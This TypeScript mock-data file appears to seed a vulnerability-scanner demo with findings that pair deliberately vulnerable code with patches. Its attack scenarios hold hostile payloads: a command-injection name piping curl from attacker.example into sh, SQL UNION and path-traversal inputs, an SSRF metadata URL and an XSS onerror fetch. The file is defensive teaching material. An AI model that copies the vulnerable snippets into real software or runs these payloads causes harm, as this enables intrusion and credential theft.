import type { Analysis, Severity, VulnStatus } from '@/types/api'
import { padSink } from '@/services/mock/source'

export interface Draft {
  projectKey: string
  title: string
  summary: string
  severity: Severity
  cwe: string
  cweName: string
  file: string
  scanner: string
  language: string
  confidence: number
  status: VulnStatus
  vulnerable: string
  patched: string
  analysis: Analysis
  explanation: string
}

function draft(input: Draft): Draft {
  return input
}

const usersVulnerable = padSink(
  `
"""Subscriber lookup for the billing admin API."""

from __future__ import annotations

import sqlite3
from collections.abc import Iterator

from fastapi import APIRouter, Depends, Query
from fastapi.responses import JSONResponse

from app.auth.session import require_analyst
from app.db.billing import connect
from app.schemas.user import UserRecord

router = APIRouter(prefix="/v1", tags=["users"])


def row_to_record(row: sqlite3.Row) -> UserRecord:
    return UserRecord(
        id=row["id"],
        email=row["email"],
        plan=row["plan"],
        region=row["region"],
    )


def connection() -> Iterator[sqlite3.Connection]:
    opened = connect()
    opened.row_factory = sqlite3.Row
    try:
        yield opened
    finally:
        opened.close()

@router.get("/users")
def find_user(
    email: str = Query(min_length=3),
    principal: str = Depends(require_analyst),
    opened: sqlite3.Connection = Depends(connection),
) -> JSONResponse:
    del principal
    @@SINK@@statement = f"SELECT id, email, plan, region FROM users WHERE email = '{email}'"
    row = opened.execute(statement).fetchone()
    if row is None:
        return JSONResponse({"user": None})
    return JSONResponse({"user": row_to_record(row).model_dump()})
`,
  42,
)

const usersPatched = padSink(`
"""Subscriber lookup for the billing admin API."""

from __future__ import annotations

import sqlite3
from collections.abc import Iterator

from fastapi import APIRouter, Depends, Query
from fastapi.responses import JSONResponse

from app.auth.session import require_analyst
from app.db.billing import connect
from app.schemas.user import UserRecord

router = APIRouter(prefix="/v1", tags=["users"])


def row_to_record(row: sqlite3.Row) -> UserRecord:
    return UserRecord(
        id=row["id"],
        email=row["email"],
        plan=row["plan"],
        region=row["region"],
    )


def connection() -> Iterator[sqlite3.Connection]:
    opened = connect()
    opened.row_factory = sqlite3.Row
    try:
        yield opened
    finally:
        opened.close()

@router.get("/users")
def find_user(
    email: str = Query(min_length=3),
    principal: str = Depends(require_analyst),
    opened: sqlite3.Connection = Depends(connection),
) -> JSONResponse:
    del principal
    @@SINK@@statement = "SELECT id, email, plan, region FROM users WHERE email = ?"
    row = opened.execute(statement, (email,)).fetchone()
    if row is None:
        return JSONResponse({"user": None})
    return JSONResponse({"user": row_to_record(row).model_dump()})
`, 42)

export const showcase: Draft[] = [
  draft({
    projectKey: 'payments',
    title: 'SQL Injection',
    summary: 'The billing user lookup concatenates the email filter into the SQL statement.',
    severity: 'critical',
    cwe: 'CWE-89',
    cweName: 'SQL Injection',
    file: 'app/api/users.py',
    scanner: 'Semgrep',
    language: 'Python',
    confidence: 96,
    status: 'patch_ready',
    vulnerable: usersVulnerable,
    patched: usersPatched,
    analysis: {
      rootCause:
        'find_user builds the SELECT statement with an f-string. The email query parameter is untrusted, and require_analyst only proves the caller is an operator. It does not constrain the characters in the filter.',
      impact:
        'An operator session, or a stolen analyst token, can close the string and append arbitrary SQL. The billing connection can read every subscriber row, not just the requested email.',
      attackScenario:
        "GET /v1/users?email=' UNION SELECT id, email, plan, region FROM users-- returns the subscriber table. A stacked statement is not required.",
      recommendedFix:
        'Keep the SQL text constant and bind the email as a parameter. Validation of the email shape can stay, but it is not the control that stops injection.',
      confidence: 96,
    },
    explanation:
      'The f-string is gone. sqlite3 receives the email as a bound value, so quotes and comment markers stay data. The handler, the auth dependency, and the response shape are unchanged.',
  }),
  draft({
    projectKey: 'payments',
    title: 'Server-Side Request Forgery',
    summary: 'Invoice fetch follows a caller-supplied URL, including link-local addresses.',
    severity: 'critical',
    cwe: 'CWE-918',
    cweName: 'Server-Side Request Forgery',
    file: 'app/webhooks/fetch.py',
    scanner: 'CodeQL',
    language: 'Python',
    confidence: 93,
    status: 'unresolved',
    vulnerable: `
"""Pull a merchant invoice document from a callback URL."""

from urllib.parse import urlparse

import httpx
from fastapi import APIRouter, HTTPException

router = APIRouter(prefix="/v1/webhooks", tags=["webhooks"])


@router.post("/invoice")
def pull_invoice(target: str) -> dict[str, int]:
    parsed = urlparse(target)
    if parsed.scheme not in {"http", "https"}:
        raise HTTPException(status_code=400, detail="unsupported scheme")
    @@SINK@@response = httpx.get(target, timeout=10, follow_redirects=True)
    response.raise_for_status()
    return {"bytes": len(response.content)}
`,
    patched: `
"""Pull a merchant invoice document from an allowlisted host."""

from urllib.parse import urlparse

import httpx
from fastapi import APIRouter, HTTPException

router = APIRouter(prefix="/v1/webhooks", tags=["webhooks"])
ALLOWED_HOSTS = {"invoices.northline.internal"}


@router.post("/invoice")
def pull_invoice(target: str) -> dict[str, int]:
    parsed = urlparse(target)
    if parsed.scheme != "https" or parsed.hostname not in ALLOWED_HOSTS:
        raise HTTPException(status_code=400, detail="target is not allowlisted")
    if parsed.username or parsed.password or parsed.port not in {None, 443}:
        raise HTTPException(status_code=400, detail="target is not allowlisted")
    response = httpx.get(target, timeout=10, follow_redirects=False)
    response.raise_for_status()
    return {"bytes": len(response.content)}
`,
    analysis: {
      rootCause:
        'pull_invoice checks only the scheme, then requests the raw URL and follows redirects. Host, port, and credentials are ignored.',
      impact:
        'The billing service can be turned into a proxy for the metadata address, internal admin panels, and any host it can route to.',
      attackScenario:
        'POST /v1/webhooks/invoice with target http://169.254.169.254/latest/meta-data/iam/security-credentials/ reads cloud credentials if the instance role is attached.',
      recommendedFix:
        'Allowlist the invoice host, require HTTPS on 443, and disable redirects so a 302 cannot leave the allowlist.',
      confidence: 93,
    },
    explanation:
      'The request is limited to https://invoices.northline.internal on port 443, with redirects disabled. A metadata address or an internal hostname no longer matches.',
  }),
  draft({
    projectKey: 'payments',
    title: 'Command Injection',
    summary: 'The export worker shells out with a filename taken from the job payload.',
    severity: 'critical',
    cwe: 'CWE-78',
    cweName: 'OS Command Injection',
    file: 'app/workers/export.py',
    scanner: 'Bandit',
    language: 'Python',
    confidence: 91,
    status: 'unresolved',
    vulnerable: `
"""Run a named export script for a settlement batch."""

import os

HOOK_ROOT = "/opt/exports"


def run_export(name: str) -> int:
    @@SINK@@return os.system(f"python {HOOK_ROOT}/{name}.py")
`,
    patched: `
"""Run a named export script for a settlement batch."""

import re
import subprocess
from pathlib import Path

HOOK_ROOT = Path("/opt/exports")
NAME = re.compile(r"[a-z0-9_]{1,48}")


def run_export(name: str) -> int:
    if NAME.fullmatch(name) is None:
        raise ValueError("export name must be a single filename")
    script = HOOK_ROOT / f"{name}.py"
    if script.parent != HOOK_ROOT:
        raise ValueError("export name must be a single filename")
    completed = subprocess.run(["python", str(script)], check=False)
    return completed.returncode
`,
    analysis: {
      rootCause:
        'run_export interpolates the job name into a shell command. os.system invokes /bin/sh, so metacharacters are executed.',
      impact:
        'A poisoned queue message runs arbitrary commands as the worker user, which can read settlement files and the task role.',
      attackScenario:
        'A job named `nightly; curl https://attacker.example/c | sh` executes during the next export tick.',
      recommendedFix:
        'Allowlist the filename and pass it as an argument to python with shell disabled.',
      confidence: 91,
    },
    explanation:
      'The shell string is gone. The name must match a filename pattern, the path cannot leave /opt/exports, and python is executed with an argument vector.',
  }),
  draft({
    projectKey: 'payments',
    title: 'Cross-Site Scripting',
    summary: 'Merchant invoice notes are written into the DOM as HTML.',
    severity: 'high',
    cwe: 'CWE-79',
    cweName: 'Cross-Site Scripting',
    file: 'web/src/billing/InvoiceNote.tsx',
    scanner: 'CodeQL',
    language: 'TypeScript',
    confidence: 88,
    status: 'in_review',
    vulnerable: `
export function InvoiceNote({ note }: { note: string }) {
  return (
    @@SINK@@<div className="invoice-note" dangerouslySetInnerHTML={{ __html: note }} />
  );
}
`,
    patched: `
export function InvoiceNote({ note }: { note: string }) {
  return <p className="invoice-note">{note}</p>;
}
`,
    analysis: {
      rootCause:
        'InvoiceNote treats the merchant note as HTML. The note is stored as the merchant typed it and is rendered for every analyst who opens the invoice.',
      impact:
        'Script in a note runs in the billing origin and can read the analyst session or call the refund API as that analyst.',
      attackScenario:
        'A merchant saves a note of `<img src=x onerror="fetch(\'/v1/refunds\',{method:\'POST\'})">`. The request fires when an analyst opens the invoice.',
      recommendedFix:
        'Render the note as text. Invoice notes are plain text in the product contract, so HTML sanitization is the wrong control.',
      confidence: 88,
    },
    explanation:
      'dangerouslySetInnerHTML is removed. React escapes the note when it is rendered as a text child, which matches the plain-text contract.',
  }),
  draft({
    projectKey: 'payments',
    title: 'Missing Authorization',
    summary: 'Refund approval loads the record by id and never checks the merchant.',
    severity: 'high',
    cwe: 'CWE-862',
    cweName: 'Missing Authorization',
    file: 'app/api/refunds.py',
    scanner: 'Semgrep',
    language: 'Python',
    confidence: 90,
    status: 'patch_ready',
    vulnerable: `
from fastapi import APIRouter, Depends, HTTPException

from app.auth.session import require_merchant
from app.db.billing import get_refund, mark_approved

router = APIRouter(prefix="/v1", tags=["refunds"])


@router.post("/refunds/{refund_id}/approve")
def approve(refund_id: str, principal=Depends(require_merchant)) -> dict[str, str]:
    refund = get_refund(refund_id)
    if refund is None:
        raise HTTPException(status_code=404, detail="refund not found")
    @@SINK@@mark_approved(refund_id, principal.id)
    return {"status": "approved"}
`,
    patched: `
from fastapi import APIRouter, Depends, HTTPException

from app.auth.session import require_merchant
from app.db.billing import get_refund, mark_approved

router = APIRouter(prefix="/v1", tags=["refunds"])


@router.post("/refunds/{refund_id}/approve")
def approve(refund_id: str, principal=Depends(require_merchant)) -> dict[str, str]:
    refund = get_refund(refund_id)
    if refund is None or refund.merchant_id != principal.merchant_id:
        raise HTTPException(status_code=404, detail="refund not found")
    mark_approved(refund_id, principal.id)
    return {"status": "approved"}
`,
    analysis: {
      rootCause:
        'approve authenticates a merchant, then approves whatever refund id was supplied. The record has a merchant_id and it is never compared.',
      impact:
        'Any merchant with a valid session can approve another merchant’s refund if they know or guess the id.',
      attackScenario:
        'POST /v1/refunds/rf_18422/approve with merchant B’s session approves merchant A’s refund.',
      recommendedFix:
        'Compare refund.merchant_id to the principal and return 404 on a mismatch so the id cannot be probed.',
      confidence: 90,
    },
    explanation:
      'The approval is rejected unless the refund belongs to the authenticated merchant. A mismatch uses the same 404 as a missing id.',
  }),
  draft({
    projectKey: 'payments',
    title: 'Prototype Pollution',
    summary: 'A recursive merge copies __proto__ from merchant-supplied JSON.',
    severity: 'medium',
    cwe: 'CWE-1321',
    cweName: 'Prototype Pollution',
    file: 'web/src/lib/merge.ts',
    scanner: 'CodeQL',
    language: 'TypeScript',
    confidence: 84,
    status: 'unresolved',
    vulnerable: `
export function merge(
  target: Record<string, unknown>,
  source: Record<string, unknown>,
): Record<string, unknown> {
  for (const key of Object.keys(source)) {
    const value = source[key];
    if (value && typeof value === "object" && !Array.isArray(value)) {
      const current = (target[key] as Record<string, unknown>) ?? {};
      @@SINK@@target[key] = merge(current, value as Record<string, unknown>);
    } else {
      target[key] = value;
    }
  }
  return target;
}
`,
    patched: `
const BLOCKED = new Set(["__proto__", "prototype", "constructor"]);

export function merge(
  target: Record<string, unknown>,
  source: Record<string, unknown>,
): Record<string, unknown> {
  for (const key of Object.keys(source)) {
    if (BLOCKED.has(key)) continue;
    const value = source[key];
    if (value && typeof value === "object" && !Array.isArray(value)) {
      const current = (target[key] as Record<string, unknown>) ?? {};
      target[key] = merge(current, value as Record<string, unknown>);
    } else {
      target[key] = value;
    }
  }
  return target;
}
`,
    analysis: {
      rootCause:
        'merge walks every key of a JSON object and assigns it onto the target. JSON.parse preserves __proto__ as an own key.',
      impact:
        'A merchant settings document can pollute Object.prototype and change later authorization or feature checks in the same process.',
      attackScenario:
        'Saving settings {"__proto__": {"isAdmin": true}} makes unset isAdmin checks succeed for later requests in the worker.',
      recommendedFix: 'Skip __proto__, prototype, and constructor before any assignment.',
      confidence: 84,
    },
    explanation:
      'Those three keys are dropped before the recursive assignment. The rest of the merge behavior is unchanged.',
  }),
  draft({
    projectKey: 'payments',
    title: 'Sensitive Data in Logs',
    summary: 'Receipt processing logs the access token next to the receipt id.',
    severity: 'low',
    cwe: 'CWE-532',
    cweName: 'Insertion of Sensitive Information into Log File',
    file: 'app/billing/receipts.py',
    scanner: 'Bandit',
    language: 'Python',
    confidence: 74,
    status: 'unresolved',
    vulnerable: `
import logging

logger = logging.getLogger(__name__)


def record_receipt(receipt_id: str, payload: dict) -> None:
    @@SINK@@logger.info("receipt %s token %s", receipt_id, payload.get("access_token"))
`,
    patched: `
import logging

logger = logging.getLogger(__name__)


def record_receipt(receipt_id: str, payload: dict) -> None:
    del payload
    logger.info("receipt %s recorded", receipt_id)
`,
    analysis: {
      rootCause: 'record_receipt writes the access token from the receipt payload into the info log.',
      impact: 'Log subscribers, support exports, and crash archives collect a bearer token.',
      attackScenario: 'A support bundle downloaded for a failed receipt includes a still-valid access token.',
      recommendedFix: 'Log the receipt id only.',
      confidence: 74,
    },
    explanation: 'The token argument is removed from the log line. The receipt id remains for correlation.',
  }),
  draft({
    projectKey: 'cyberguard',
    title: 'Hardcoded API Key',
    summary: 'The broker client ships with a live-format API key in the module.',
    severity: 'high',
    cwe: 'CWE-798',
    cweName: 'Use of Hard-coded Credentials',
    file: 'app/brokers/config.py',
    scanner: 'Gitleaks',
    language: 'Python',
    confidence: 99,
    status: 'patch_ready',
    vulnerable: `
"""Credentials for the market-data broker."""

import httpx

@@SINK@@BROKER_KEY = "nk_live_northline_demo_4f91c2"


def broker_client() -> httpx.Client:
    return httpx.Client(
        base_url="https://broker.northline.internal",
        headers={"X-Api-Key": BROKER_KEY},
        timeout=8,
    )
`,
    patched: `
"""Credentials for the market-data broker."""

import os

import httpx


def broker_key() -> str:
    key = os.environ.get("BROKER_API_KEY")
    if not key:
        raise RuntimeError("BROKER_API_KEY is not set")
    return key


def broker_client() -> httpx.Client:
    return httpx.Client(
        base_url="https://broker.northline.internal",
        headers={"X-Api-Key": broker_key()},
        timeout=8,
    )
`,
    analysis: {
      rootCause: 'BROKER_KEY is a string literal in the repository. Gitleaks matched the nk_live_ prefix.',
      impact: 'Read access to the repository is enough to call the market-data broker as CyberGuard.',
      attackScenario:
        'The key is reused from a fork or an old image after rotation was assumed, because the value never lived in a secret store.',
      recommendedFix: 'Read BROKER_API_KEY from the environment and fail to boot the client when it is absent.',
      confidence: 99,
    },
    explanation:
      'The literal key is deleted. The client resolves BROKER_API_KEY when it is constructed and raises if the variable is missing.',
  }),
  draft({
    projectKey: 'cyberguard',
    title: 'Weak Password Hash',
    summary: 'Operator passwords are stored as unsalted MD5 digests.',
    severity: 'medium',
    cwe: 'CWE-328',
    cweName: 'Use of Weak Hash',
    file: 'app/auth/passwords.py',
    scanner: 'Bandit',
    language: 'Python',
    confidence: 86,
    status: 'patch_ready',
    vulnerable: `
import hashlib


def hash_password(password: str) -> str:
    @@SINK@@return hashlib.md5(password.encode()).hexdigest()
`,
    patched: `
import base64
import hashlib
import os


def hash_password(password: str) -> str:
    salt = os.urandom(16)
    digest = hashlib.scrypt(password.encode(), salt=salt, n=2**14, r=8, p=1)
    return base64.b64encode(salt + digest).decode()
`,
    analysis: {
      rootCause: 'hash_password uses MD5 with no salt. The same password always produces the same digest.',
      impact: 'A leaked operator table can be cracked with commodity hardware, and reused passwords are obvious.',
      attackScenario: 'The digest of "Winter2024!" is looked up in a precomputed table and reused against the admin console.',
      recommendedFix: 'Store a unique salt and an scrypt digest. Existing MD5 rows need a rehash on next login.',
      confidence: 86,
    },
    explanation:
      'MD5 is replaced with scrypt and a random 16-byte salt stored beside the digest. Identical passwords no longer share a hash.',
  }),
  draft({
    projectKey: 'patchpilot',
    title: 'Vulnerable Dependency',
    summary: 'PyYAML 5.3.1 is pinned in the base requirements and is in the vulnerable range.',
    severity: 'high',
    cwe: 'CWE-1395',
    cweName: 'Dependency on Vulnerable Third-Party Component',
    file: 'requirements/base.txt',
    scanner: 'Trivy',
    language: 'Python',
    confidence: 97,
    status: 'patch_ready',
    vulnerable: `
fastapi==0.115.4
uvicorn==0.32.0
pydantic==2.9.2
@@SINK@@pyyaml==5.3.1
httpx==0.27.2
`,
    patched: `
fastapi==0.115.4
uvicorn==0.32.0
pydantic==2.9.2
pyyaml==6.0.2
httpx==0.27.2
`,
    analysis: {
      rootCause:
        'requirements/base.txt pins pyyaml==5.3.1. Full loaders in that line can execute Python objects from untrusted YAML, tracked as CVE-2020-14343.',
      impact:
        'Any caller who can reach a full loader, including the policy upload path, can execute code inside the API process.',
      attackScenario:
        'A policy document with a crafted YAML tag instantiates an arbitrary object during load. The pin keeps the fix from landing.',
      recommendedFix: 'Move the pin to PyYAML 6.0.2 or newer and keep the loader on safe_load.',
      confidence: 97,
    },
    explanation:
      'The pin moves from 5.3.1 to 6.0.2, which rejects the loader path used by CVE-2020-14343. Neighboring pins are untouched.',
  }),
  draft({
    projectKey: 'patchpilot',
    title: 'Unsafe YAML Load',
    summary: 'Policy upload uses yaml.Loader, which constructs arbitrary Python objects.',
    severity: 'medium',
    cwe: 'CWE-502',
    cweName: 'Deserialization of Untrusted Data',
    file: 'app/policy/loader.py',
    scanner: 'Bandit',
    language: 'Python',
    confidence: 92,
    status: 'unresolved',
    vulnerable: `
import yaml


def load_policy(raw: str) -> dict:
    @@SINK@@return yaml.load(raw, Loader=yaml.Loader)
`,
    patched: `
import yaml


def load_policy(raw: str) -> dict:
    loaded = yaml.safe_load(raw)
    if not isinstance(loaded, dict):
        raise ValueError("policy document must be a mapping")
    return loaded
`,
    analysis: {
      rootCause: 'load_policy calls yaml.load with the full Loader. That loader honors Python-specific tags.',
      impact: 'A policy file can execute code as the API user during upload.',
      attackScenario:
        'An uploaded document tagged to call a subprocess constructor runs at parse time, before schema validation.',
      recommendedFix: 'Use safe_load and require the result to be a mapping.',
      confidence: 92,
    },
    explanation:
      'The full loader is replaced with safe_load, and a non-mapping document is rejected before it reaches the policy engine.',
  }),
  draft({
    projectKey: 'patchpilot',
    title: 'Debug Endpoint Exposed',
    summary: 'An internal route dumps the process environment, including secrets.',
    severity: 'low',
    cwe: 'CWE-489',
    cweName: 'Active Debug Code',
    file: 'app/internal/debug.py',
    scanner: 'Semgrep',
    language: 'Python',
    confidence: 80,
    status: 'accepted_risk',
    vulnerable: `
import os

from fastapi import APIRouter

router = APIRouter(prefix="/internal", tags=["internal"])


@router.get("/debug/config")
def dump_config() -> dict:
    @@SINK@@return {"env": dict(os.environ)}
`,
    patched: `
from fastapi import APIRouter, HTTPException

router = APIRouter(prefix="/internal", tags=["internal"])


@router.get("/debug/config")
def dump_config() -> dict:
    raise HTTPException(status_code=404, detail="not found")
`,
    analysis: {
      rootCause: 'dump_config returns os.environ from a route that is still importable.',
      impact: 'If the router is mounted, every secret injected into the process is readable.',
      attackScenario:
        'GET /internal/debug/config on a preview deploy that mounted the internal router returns BROKER_API_KEY and the database URL.',
      recommendedFix:
        'Delete the route. The current acceptance is limited to images where this router is not included in the production ASGI app.',
      confidence: 80,
    },
    explanation:
      'The handler no longer reads the environment. It returns 404 so old bookmarks do not reveal whether the route existed.',
  }),
  draft({
    projectKey: 'secureauth',
    title: 'JWT Algorithm Not Pinned',
    summary: 'Token verification returns the HMAC key without checking the alg header.',
    severity: 'high',
    cwe: 'CWE-347',
    cweName: 'Improper Verification of Cryptographic Signature',
    file: 'internal/tokens/verify.go',
    scanner: 'Gosec',
    language: 'Go',
    confidence: 94,
    status: 'patch_ready',
    vulnerable: `
package tokens

import "github.com/golang-jwt/jwt/v5"

func Verify(token string, key []byte) (jwt.MapClaims, error) {
    parsed, err := jwt.Parse(token, func(t *jwt.Token) (any, error) {
        @@SINK@@return key, nil
    })
    if err != nil || !parsed.Valid {
        return nil, err
    }
    claims, ok := parsed.Claims.(jwt.MapClaims)
    if !ok {
        return nil, err
    }
    return claims, nil
}
`,
    patched: `
package tokens

import (
    "errors"

    "github.com/golang-jwt/jwt/v5"
)

func Verify(token string, key []byte) (jwt.MapClaims, error) {
    parsed, err := jwt.Parse(token, func(t *jwt.Token) (any, error) {
        if t.Method == nil || t.Method.Alg() != jwt.SigningMethodHS256.Alg() {
            return nil, errors.New("unexpected signing method")
        }
        return key, nil
    })
    if err != nil || !parsed.Valid {
        return nil, err
    }
    claims, ok := parsed.Claims.(jwt.MapClaims)
    if !ok {
        return nil, err
    }
    return claims, nil
}
`,
    analysis: {
      rootCause:
        'The key function returns the HMAC secret for every header. The alg value is never compared to HS256.',
      impact:
        'A caller who can mint a token can select a signing method this service did not intend to accept.',
      attackScenario:
        'A token with an unexpected alg is verified with the raw HMAC key and issued a session for the sub claim inside it.',
      recommendedFix: 'Reject the token unless the method is exactly HS256, before the key is returned.',
      confidence: 94,
    },
    explanation:
      'Verification now fails closed unless the header algorithm is HS256. The same key is used only after that check.',
  }),
  draft({
    projectKey: 'secureauth',
    title: 'Log Injection',
    summary: 'The access logger writes the user agent without stripping line breaks.',
    severity: 'low',
    cwe: 'CWE-117',
    cweName: 'Improper Output Neutralization for Logs',
    file: 'internal/http/access.go',
    scanner: 'Gosec',
    language: 'Go',
    confidence: 77,
    status: 'unresolved',
    vulnerable: `
package httpx

import "log"

func Access(userID, agent string) {
    @@SINK@@log.Printf("access user=%s agent=%s", userID, agent)
}
`,
    patched: `
package httpx

import (
    "log"
    "strings"
)

func Access(userID, agent string) {
    clean := strings.NewReplacer("\\n", " ", "\\r", " ").Replace(agent)
    log.Printf("access user=%s agent=%s", userID, clean)
}
`,
    analysis: {
      rootCause: 'Access copies the User-Agent header into a single log line.',
      impact: 'A client can forge extra log records and dilute the audit trail.',
      attackScenario:
        'A user agent of "Mozilla\\nlevel=error user=root action=grant-admin" creates a second line that downstream alerts treat as real.',
      recommendedFix: 'Replace CR and LF with spaces before formatting the line.',
      confidence: 77,
    },
    explanation: 'Newlines in the user agent are folded to spaces, so one request stays one log record.',
  }),
  draft({
    projectKey: 'ledger',
    title: 'Insecure Deserialization',
    summary: 'Snapshot upload is decoded with ObjectInputStream.',
    severity: 'critical',
    cwe: 'CWE-502',
    cweName: 'Deserialization of Untrusted Data',
    file: 'src/main/java/io/northline/ledger/SnapshotReader.java',
    scanner: 'Semgrep',
    language: 'Java',
    confidence: 95,
    status: 'unresolved',
    vulnerable: `
package io.northline.ledger;

import java.io.InputStream;
import java.io.ObjectInputStream;

public final class SnapshotReader {
    public Snapshot read(InputStream body) throws Exception {
        @@SINK@@try (ObjectInputStream input = new ObjectInputStream(body)) {
            return (Snapshot) input.readObject();
        }
    }
}
`,
    patched: `
package io.northline.ledger;

import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.InputStream;

public final class SnapshotReader {
    private final ObjectMapper mapper = new ObjectMapper();

    public Snapshot read(InputStream body) throws Exception {
        return mapper.readValue(body, Snapshot.class);
    }
}
`,
    analysis: {
      rootCause:
        'SnapshotReader accepts a Java serialized object from the request body. ObjectInputStream will instantiate types named in the stream.',
      impact: 'A gadget chain on the classpath can run code as the ledger process during upload.',
      attackScenario:
        'A snapshot POST whose body is a crafted serialized object triggers a known gadget before any field validation.',
      recommendedFix: 'Replace the object stream with a JSON DTO mapped by Jackson to Snapshot.class only.',
      confidence: 95,
    },
    explanation:
      'ObjectInputStream is removed. The body is read as JSON into the Snapshot type, so gadget class names are no longer resolved.',
  }),
  draft({
    projectKey: 'ledger',
    title: 'Path Traversal',
    summary: 'The export controller resolves a request parameter under the export directory.',
    severity: 'high',
    cwe: 'CWE-22',
    cweName: 'Path Traversal',
    file: 'src/main/java/io/northline/ledger/ExportController.java',
    scanner: 'Semgrep',
    language: 'Java',
    confidence: 97,
    status: 'patch_ready',
    vulnerable: `
package io.northline.ledger;

import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public final class ExportController {
    private static final Path ROOT = Paths.get("/var/ledger/exports");

    public byte[] export(String name) throws Exception {
        @@SINK@@return Files.readAllBytes(ROOT.resolve(name));
    }
}
`,
    patched: `
package io.northline.ledger;

import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public final class ExportController {
    private static final Path ROOT = Paths.get("/var/ledger/exports").toAbsolutePath().normalize();

    public byte[] export(String name) throws Exception {
        Path candidate = ROOT.resolve(name).toAbsolutePath().normalize();
        if (!candidate.startsWith(ROOT)) {
            throw new IllegalArgumentException("export escapes the ledger directory");
        }
        return Files.readAllBytes(candidate);
    }
}
`,
    analysis: {
      rootCause: 'export passes the name query parameter to Path.resolve and reads the result.',
      impact: 'Any file readable by the ledger user can be downloaded through the export route.',
      attackScenario: 'GET /exports?name=../../../../etc/hostname returns the host file when the process can read it.',
      recommendedFix: 'Normalize the candidate and reject paths that do not stay under /var/ledger/exports.',
      confidence: 97,
    },
    explanation:
      'The resolved path is compared with the normalized export root. A name that climbs out of the directory is rejected before the read.',
  }),
  draft({
    projectKey: 'ledger',
    title: 'XML External Entity',
    summary: 'Counterparty policy XML is parsed with a default DocumentBuilder.',
    severity: 'medium',
    cwe: 'CWE-611',
    cweName: 'Improper Restriction of XML External Entity Reference',
    file: 'src/main/java/io/northline/ledger/PolicyParser.java',
    scanner: 'CodeQL',
    language: 'Java',
    confidence: 89,
    status: 'unresolved',
    vulnerable: `
package io.northline.ledger;

import java.io.InputStream;
import javax.xml.parsers.DocumentBuilderFactory;
import org.w3c.dom.Document;

public final class PolicyParser {
    public Document parse(InputStream body) throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        @@SINK@@return factory.newDocumentBuilder().parse(body);
    }
}
`,
    patched: `
package io.northline.ledger;

import java.io.InputStream;
import javax.xml.XMLConstants;
import javax.xml.parsers.DocumentBuilderFactory;
import org.w3c.dom.Document;

public final class PolicyParser {
    public Document parse(InputStream body) throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        factory.setExpandEntityReferences(false);
        return factory.newDocumentBuilder().parse(body);
    }
}
`,
    analysis: {
      rootCause: 'PolicyParser uses a default DocumentBuilderFactory, which still processes doctypes.',
      impact: 'A policy upload can read local files or make the server request an internal URL.',
      attackScenario:
        'A DOCTYPE with a SYSTEM entity pointed at file:///var/ledger/exports/latest.csv embeds that file in the parsed document.',
      recommendedFix: 'Disallow doctypes and disable entity expansion before parse.',
      confidence: 89,
    },
    explanation:
      'The factory now rejects doctypes and does not expand entities, so an external reference cannot be loaded.',
  }),
  draft({
    projectKey: 'edge',
    title: 'Disabled TLS Verification',
    summary: 'The origin client accepts any certificate.',
    severity: 'high',
    cwe: 'CWE-295',
    cweName: 'Improper Certificate Validation',
    file: 'src/upstream.rs',
    scanner: 'Semgrep',
    language: 'Rust',
    confidence: 90,
    status: 'in_review',
    vulnerable: `
use reqwest::Client;

pub fn origin_client() -> reqwest::Result<Client> {
    @@SINK@@Client::builder().danger_accept_invalid_certs(true).build()
}
`,
    patched: `
use reqwest::Client;

pub fn origin_client() -> reqwest::Result<Client> {
    Client::builder().build()
}
`,
    analysis: {
      rootCause:
        'origin_client enables danger_accept_invalid_certs. It was added to talk to a dev origin with a bad certificate and left in the proxy binary.',
      impact: 'Anyone on the path between the edge and the origin can present a forged certificate and read traffic.',
      attackScenario:
        'A network position answers the origin handshake with a self-signed certificate. The proxy accepts it and forwards settlement headers.',
      recommendedFix:
        'Use the default verifier. If the origin uses a private CA, install that CA. Do not disable validation.',
      confidence: 90,
    },
    explanation:
      'The invalid-certificate override is removed. The client uses the process trust store again.',
  }),
  draft({
    projectKey: 'edge',
    title: 'Open Redirect',
    summary: 'The login handler redirects to a next parameter without checking the host.',
    severity: 'low',
    cwe: 'CWE-601',
    cweName: 'URL Redirection to Untrusted Site',
    file: 'src/http/login.rs',
    scanner: 'Semgrep',
    language: 'Rust',
    confidence: 73,
    status: 'unresolved',
    vulnerable: `
pub fn next_location(next: &str) -> String {
    @@SINK@@next.to_string()
}
`,
    patched: `
pub fn next_location(next: &str) -> String {
    if next.starts_with('/') && !next.starts_with("//") && !next.contains("://") {
        return next.to_string();
    }
    "/".to_string()
}
`,
    analysis: {
      rootCause: 'next_location returns the query value unchanged, and the login response uses it as the Location header.',
      impact: 'A phishing link can bounce off the real edge hostname and land on an attacker site after a successful login.',
      attackScenario:
        'https://edge.northline.dev/login?next=https://northline-login.example sends the browser off-site after authentication.',
      recommendedFix: 'Allow only a single-slash relative path.',
      confidence: 73,
    },
    explanation:
      'Absolute URLs and protocol-relative URLs fall back to /. Only a same-origin path is preserved.',
  }),
]

export function discoveriesFor(language: string, slug: string): Draft[] {
  const key = 'discovered'
  if (language === 'TypeScript') {
    return [
      { ...showcase.find((item) => item.title === 'Cross-Site Scripting')!, projectKey: key, file: `web/src/${slug}/Note.tsx`, status: 'unresolved' },
      { ...showcase.find((item) => item.title === 'Prototype Pollution')!, projectKey: key, file: `web/src/${slug}/merge.ts`, status: 'unresolved' },
    ]
  }
  if (language === 'Go') {
    return [
      { ...showcase.find((item) => item.title === 'JWT Algorithm Not Pinned')!, projectKey: key, file: `internal/${slug}/verify.go`, status: 'unresolved' },
      { ...showcase.find((item) => item.title === 'Log Injection')!, projectKey: key, file: `internal/${slug}/access.go`, status: 'unresolved' },
    ]
  }
  if (language === 'Java') {
    return [
      { ...showcase.find((item) => item.title === 'Path Traversal')!, projectKey: key, file: `src/main/java/${slug}/ExportController.java`, status: 'unresolved' },
      { ...showcase.find((item) => item.title === 'XML External Entity')!, projectKey: key, file: `src/main/java/${slug}/PolicyParser.java`, status: 'unresolved' },
    ]
  }
  if (language === 'Rust') {
    return [
      { ...showcase.find((item) => item.title === 'Disabled TLS Verification')!, projectKey: key, file: `src/${slug}/upstream.rs`, status: 'unresolved' },
      { ...showcase.find((item) => item.title === 'Open Redirect')!, projectKey: key, file: `src/${slug}/login.rs`, status: 'unresolved' },
    ]
  }
  return [
